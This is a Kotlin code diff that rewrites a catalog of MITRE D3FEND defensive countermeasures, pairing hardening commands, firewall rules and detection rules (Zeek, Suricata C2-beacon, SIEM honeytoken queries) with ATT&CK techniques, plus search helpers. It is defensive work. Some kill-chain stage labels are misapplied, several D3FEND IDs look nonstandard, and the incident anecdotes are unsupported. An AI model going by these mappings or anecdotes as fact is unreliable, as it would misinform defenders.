-            tags = listOf("Harden", "LSASS", "PPL", "Credential Guard")
-        ),
-        MitreD3fendItem(
-            d3fendId = "D3-SH",
-            name = "System Hardening & Vulnerability Patching",
-            tactic = MitreDefendTactic.HARDEN,
-            description = "Remediate kernel and hypervisor vulnerabilities through automated patch orchestration and Attack Surface Reduction (ASR) policies.",
-            ruleOrFix = "Set-MpPreference -AttackSurfaceReductionRules_Ids 5beb8efe-19a9-4276-8380-423e97086ec1 -AttackSurfaceReductionRules_Actions Enabled",
-            counteredAttackIds = listOf("T1068"),
-            tags = listOf("Harden", "ASR", "Kernel", "Patching")
+            description = "Harden local credential stores by enforcing LSA Protection mode and enabling Credential Guard.",
+            ruleOrFix = """
+# Enable LSA Protected Mode in Windows Registry
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f
+            """.trimIndent(),
+            counteredAttackIds = listOf("T1003"),
+            tags = listOf("Harden", "RunAsPPL", "LSASS", "CredentialGuard"),
+            subTechniquesList = listOf(
+                SubTechniqueItem("D3-LSA.1", "Virtualization-Based Security", "Isolating Kerberos tickets in hypervisor-protected memory.", "Enable Windows Credential Guard via GPO"),
+                SubTechniqueItem("D3-LSA.2", "Process Handle Restriction", "Restricting process handle permissions to LSASS.", "Block ProcessAccess permissions to lsass.exe via Sysmon")
+            ),
+            nistControls = listOf(
+                NistControlMapping("PR.AC-1", "Access Control & Credential Protection", "Protect (PR) / Access Control", "Enforce hardware-enforced credential protection mechanisms.", "Enable LSA Protected Mode and Credential Guard across enterprise workstations.")
+            ),
+            cyberKillChain = CyberKillChainInfo(
+                stage = "Stage 6: Command & Control Defense",
+                stageNumber = 6,
+                description = "Blocking adversary attempts to extract LSASS memory credentials.",
+                scenarioExample = "Enforcing RunAsPPL prevented Mimikatz from opening a memory handle to LSASS during an active ransomware intrusion."
+            )
         ),
 
-        // ==================== 3. DETECT ====================
-        MitreD3fendItem(
-            d3fendId = "D3-PSA",
-            name = "Process Segment Analysis & AMSI Inspection",
-            tactic = MitreDefendTactic.DETECT,
-            description = "Monitor process execution trees, AMSI script invocations, and DLL injection events using EDR and Sysmon event telemetry.",
-            ruleOrFix = "[Environment]::SetEnvironmentVariable('__PSLockdownPolicy', '4', 'Machine')",
-            counteredAttackIds = listOf("T1059.001", "T1547.001", "T1027"),
-            tags = listOf("Detect", "EDR", "AMSI", "Sysmon", "PowerShell")
-        ),
+        // ==================== 3. DETECT (D3-TACTIC-DETECT) ====================
         MitreD3fendItem(
             d3fendId = "D3-NTA",
-            name = "Network Traffic Analysis & TLS Inspection",
+            name = "Network Traffic Pattern Analysis & Behavioral Anomaly Detection",
             tactic = MitreDefendTactic.DETECT,
-            description = "Inspect encrypted outbound network traffic, WAF requests, and proxy sessions to detect C2 beacons, port scans, and exfiltration bursts.",
-            ruleOrFix = "alert http \$HOME_NET any -> \$EXTERNAL_NET any (msg:'Sliver C2 HTTP Beacon Detected'; content:'POST'; http_method; sid:1000021;)",
-            counteredAttackIds = listOf("T1595.002", "T1071.001", "T1567.002"),
-            tags = listOf("Detect", "NTA", "Suricata", "WAF", "TLS")
-        ),
-        MitreD3fendItem(
-            d3fendId = "D3-UBA",
-            name = "User Behavior Analytics & Mail Flow Monitoring",
-            tactic = MitreDefendTactic.DETECT,
-            description = "Detect anomalous user activities such as high-volume file downloads, mailbox auto-forwarding rule creation, and out-of-hours admin logins.",
-            ruleOrFix = "Set-HostedOutboundSpamFilterPolicy -Identity Default -AutoForwardingMode Disable",
-            counteredAttackIds = listOf("T1114.002"),
-            tags = listOf("Detect", "UEBA", "Mail Flow", "M365")
+            description = "Analyze NetFlow telemetry, HTTP/S requests, and DNS query bursts to identify adversary scanning and C2 beaconing.",
+            ruleOrFix = """
+# Zeek / Bro Script: Detect High-Frequency HTTP Scanner Request Bursts
+event http_request(c: connection, method: string, URI: string) {
+    if ( c${'$'}http${'$'}num_requests > 100 )
+        NOTICE([${'$'}note=HTTP::Scanner_Burst, ${'$'}msg="Possible automated scanner"]);
+}
+            """.trimIndent(),
+            counteredAttackIds = listOf("T1595", "T1071", "T1567"),
+            tags = listOf("Detect", "NetFlow", "Zeek", "NTA"),
+            subTechniquesList = listOf(
+                SubTechniqueItem("D3-NTA.1", "NetFlow Telemetry Inspection", "Analyze IPFIX and NetFlow records for anomalous volume spikes.", "Flowmon NetFlow analyzer"),
+                SubTechniqueItem("D3-NTA.2", "JA3 TLS Fingerprinting", "Match TLS Client Hello hashes against Cobalt Strike beacon profiles.", "Suricata JA3 match rules")
+            ),
+            nistControls = listOf(
+                NistControlMapping("DE.CM-1", "Continuous Monitoring", "Detect (DE) / Detection", "Monitor network communications for unauthorized activities and anomaly bursts.", "Deploy Zeek network security monitoring across all internet egress points.")
+            ),
+            cyberKillChain = CyberKillChainInfo(
+                stage = "Stage 6: Command & Control Defense",
+                stageNumber = 6,
+                description = "Detecting automated C2 beacon heartbeats traversing HTTPS egress proxies.",
+                scenarioExample = "Suricata JA3 fingerprint rules alerted SOC analysts to an active Cobalt Strike beacon channel within 5 minutes of initial execution."
+            )
         ),
 
-        // ==================== 4. ISOLATE ====================
+        // ==================== 4. ISOLATE (D3-TACTIC-ISOLATE) ====================
         MitreD3fendItem(
-            d3fendId = "D3-EBR",
-            name = "Executable Behavior Restriction & Sandboxing",
+            d3fendId = "D3-SMB",
+            name = "SMB Micro-segmentation & Lateral Movement Restriction",
             tactic = MitreDefendTactic.ISOLATE,
-            description = "Isolate email attachment execution within containerized sandboxes and restrict child process creation from Office documents.",
-            ruleOrFix = "New-TransportRule -Name 'Block Dangerous Attachments' -AttachmentHasExecutableContent ${'$'}true -BlockMessage ${'$'}true",
-            counteredAttackIds = listOf("T1566.001"),
-            tags = listOf("Isolate", "Sandbox", "Attachment", "Container")
-        ),
-        MitreD3fendItem(
-            d3fendId = "D3-DNSI",
-            name = "Dynamic Network Segment Isolation",
-            tactic = MitreDefendTactic.ISOLATE,
-            description = "Enforce Zero Trust microsegmentation to block lateral movement across workstations, isolating lateral ports (RDP 3389, SMB 445, WinRM 5985).",
-            ruleOrFix = "New-NetFirewallRule -Name 'Restrict-RDP' -Direction Inbound -Protocol TCP -LocalPort 3389 -RemoteAddress 10.0.100.0/24 -Action Allow",
-            counteredAttackIds = listOf("T1021.001"),
-            tags = listOf("Isolate", "Microsegmentation", "Firewall", "Zero Trust")
+            description = "Isolate workstation subnets and enforce host firewall rules preventing lateral SMB connection attempts.",
+            ruleOrFix = """
+# PowerShell Host Firewall Rule: Block Workstation-to-Workstation Port 445
+New-NetFirewallRule -DisplayName "Block Workstation SMB Inbound" -Direction Inbound -LocalPort 445 -Protocol TCP -Action Block -RemoteAddress 10.10.0.0/16
+            """.trimIndent(),
+            counteredAttackIds = listOf("T1021"),
+            tags = listOf("Isolate", "SMB", "Microsegmentation", "Firewall"),
+            subTechniquesList = listOf(
+                SubTechniqueItem("D3-SMB.1", "Port 445 Workstation Block", "Dropping inbound SMB traffic between non-server IP ranges.", "Windows Firewall inbound block rule"),
+                SubTechniqueItem("D3-SMB.2", "Admin Share Restriction", "Disabling default ADMIN$ and C$ shares on user endpoints.", "reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters /v AutoShareWks /t REG_DWORD /d 0")
+            ),
+            nistControls = listOf(
+                NistControlMapping("PR.AC-5", "Network Separation", "Protect (PR) / Network Separation", "Segment internal networks to prevent uncontrolled lateral movement.", "Deploy micro-segmentation policies restricting SMB traffic to designated management servers.")
+            ),
+            cyberKillChain = CyberKillChainInfo(
+                stage = "Stage 6: Command & Control Defense",
+                stageNumber = 6,
+                description = "Containing adversary lateral movement within a single isolated VLAN.",
+                scenarioExample = "Enforcing SMB micro-segmentation prevented NotPetya malware from spreading beyond the initial weaponized host."
+            )
         ),
 
-        // ==================== 5. DECEIVE ====================
+        // ==================== 5. DECEIVE (D3-TACTIC-DECEIVE) ====================
         MitreD3fendItem(
-            d3fendId = "D3-DE",
-            name = "Decoy Environment & Honeytoken Accounts",
+            d3fendId = "D3-ADC",
+            name = "Active Directory Canary Honeytokens & Decoy Accounts",
             tactic = MitreDefendTactic.DECEIVE,
-            description = "Deploy bait Active Directory accounts, honey-hashes, and fake administrative credentials to trigger immediate high-confidence alerts upon adversary discovery.",
-            ruleOrFix = "event.code: 4662 and object.type: 'user' and user.name: 'HoneyUserAdmin'",
-            counteredAttackIds = listOf("T1087.002"),
-            tags = listOf("Deceive", "Honeypot", "Honeytoken", "Active Directory")
+            description = "Deploy attractive decoy accounts and Kerberos tickets in Active Directory to trigger immediate high-priority alerts upon adversary enumeration.",
+            ruleOrFix = """
+# SIEM Alert: Detect LDAP Query targeting Canary Honeytoken "svc_admin_canary"
+index=winlogbeat EventCode=4662 Properties="*svc_admin_canary*"
+            """.trimIndent(),
+            counteredAttackIds = listOf("T1087", "T1003"),
+            tags = listOf("Deceive", "Canary", "Honeytoken", "ActiveDirectory"),
+            subTechniquesList = listOf(
+                SubTechniqueItem("D3-ADC.1", "Canary User Accounts", "Creating decoy Domain Admin accounts with active monitoring.", "Active Directory account 'admin_canary'"),
+                SubTechniqueItem("D3-ADC.2", "Fake SPN Kerberoasting Traps", "Configuring fake Service Principal Names (SPNs) with weak passwords to catch Kerberoasting.", "Set-ADUser -Identity canary_spn -ServicePrincipalNames 'MSSQL/canary'")
+            ),
+            nistControls = listOf(
+                NistControlMapping("DE.DP-1", "Detection Processes", "Detect (DE) / Deception", "Deploy deceptive artifacts to catch stealthy adversary internal discovery.", "Deploy Active Directory honeytoken accounts monitored by SIEM real-time alerts.")
+            ),
+            cyberKillChain = CyberKillChainInfo(
+                stage = "Stage 6: Command & Control Defense",
+                stageNumber = 6,
+                description = "Trapping adversaries during Active Directory Kerberoasting and account discovery.",
+                scenarioExample = "An adversary executing BloodHound triggered an immediate SIEM alert upon querying a planted canary Domain Admin account."
+            )
         ),
 
-        // ==================== 6. EVICT ====================
+        // ==================== 6. EVICT (D3-TACTIC-EVICT) ====================
         MitreD3fendItem(
-            d3fendId = "D3-PT",
-            name = "Process Termination & Automated EDR Quarantining",
+            d3fendId = "D3-RWD",
+            name = "Automated Endpoint Process Eviction & Isolation",
             tactic = MitreDefendTactic.EVICT,
-            description = "Automate immediate process termination, host network isolation, and session revocation upon detection of ransomware or malicious service tampering.",
-            ruleOrFix = "Stop-Process -Name 'ransom_payload' -Force; Set-NetAdapter -Name 'Ethernet' -Status Disabled",
-            counteredAttackIds = listOf("T1489"),
-            tags = listOf("Evict", "Process Kill", "EDR", "Quarantine")
-        ),
-        MitreD3fendItem(
-            d3fendId = "D3-IRP",
-            name = "Immutable Remote Backups & Ransomware Eviction",
-            tactic = MitreDefendTactic.EVICT,
-            description = "Maintain air-gapped, write-once-read-many (WORM) backups and trigger automatic system recovery upon ransomware encryption alerts.",
-            ruleOrFix = "aws s3api put-object-lock-configuration --bucket CorpBackups --object-lock-configuration 'ObjectLockEnabled=Enabled'",
-            counteredAttackIds = listOf("T1486"),
-            tags = listOf("Evict", "Immutable Backup", "WORM", "Ransomware")
+            description = "Automatically terminate malicious execution threads, revoke compromised user session tokens, and isolate compromised endpoints from the network.",
+            ruleOrFix = """
+# Defender for Endpoint Automated Investigation & Response (AIR)
+Set-MpPreference -EnableNetworkProtection Enabled -SubmitSamplesConsent 1
+            """.trimIndent(),
+            counteredAttackIds = listOf("T1486", "T1059", "T1068"),
+            tags = listOf("Evict", "EDR", "ProcessKill", "NetworkIsolation"),
+            subTechniquesList = listOf(
+                SubTechniqueItem("D3-RWD.1", "Automated Process Termination", "Freezing and terminating malicious execution threads instantly.", "EDR process termination trigger"),
+                SubTechniqueItem("D3-RWD.2", "Network Session Revocation", "Disconnecting compromised endpoint from network VLAN.", "Automated switch port shutdown via RADIUS")
+            ),
+            nistControls = listOf(
+                NistControlMapping("RS.RP-1", "Response Execution", "Respond (RS) / Containment", "Execute containment actions to isolate compromised hosts and terminate malicious execution.", "Enable EDR Automated Response to isolate ransomware-infected hosts within 30 seconds.")
+            ),
+            cyberKillChain = CyberKillChainInfo(
+                stage = "Stage 7: Actions on Objectives Defense",
+                stageNumber = 7,
+                description = "Evicting the adversary before ransomware encryption or data exfiltration is completed.",
+                scenarioExample = "Automated EDR containment rules severed network connectivity and killed process handles within 20 seconds of LockBit execution."
+            )
         )
     )
 
-    fun filterTtps(
-        query: String = "",
-        selectedTactic: MitreTactic? = null
-    ): List<MitreTtpItem> {
+    fun getTtpsByTactic(tactic: MitreTactic): List<MitreTtpItem> {
+        return allTtps.filter { it.tactic == tactic }
+    }
+
+    fun getD3fendByTactic(tactic: MitreDefendTactic): List<MitreD3fendItem> {
+        return allD3fendItems.filter { it.tactic == tactic }
+    }
+
+    fun filterTtps(query: String = "", tactic: MitreTactic? = null): List<MitreTtpItem> {
         val q = query.trim().lowercase()
         return allTtps.filter { ttp ->
+            val matchesTactic = tactic == null || ttp.tactic == tactic
             val matchesQuery = q.isEmpty() ||
                     ttp.techniqueId.lowercase().contains(q) ||
                     ttp.name.lowercase().contains(q) ||
+                    ttp.description.lowercase().contains(q) ||
                     ttp.d3fendId.lowercase().contains(q) ||
                     ttp.d3fendName.lowercase().contains(q) ||
-                    ttp.description.lowercase().contains(q) ||
                     ttp.knownAptGroups.any { it.lowercase().contains(q) } ||
                     ttp.tags.any { it.lowercase().contains(q) }
-
-            val matchesTactic = selectedTactic == null || ttp.tactic == selectedTactic
-
-            matchesQuery && matchesTactic
-        }
-    }
-
-    fun filterD3fendTtps(
-        query: String = "",
-        selectedDefendTactic: MitreDefendTactic? = null
-    ): List<MitreD3fendItem> {
-        val q = query.trim().lowercase()
-        return allD3fendItems.filter { d3 ->
-            val matchesQuery = q.isEmpty() ||
-                    d3.d3fendId.lowercase().contains(q) ||
-                    d3.name.lowercase().contains(q) ||
-                    d3.description.lowercase().contains(q) ||
-                    d3.counteredAttackIds.any { it.lowercase().contains(q) } ||
-                    d3.tags.any { it.lowercase().contains(q) }
-
-            val matchesTactic = selectedDefendTactic == null || d3.tactic == selectedDefendTactic
-
-            matchesQuery && matchesTactic
+            matchesTactic && matchesQuery
         }
     }
 }
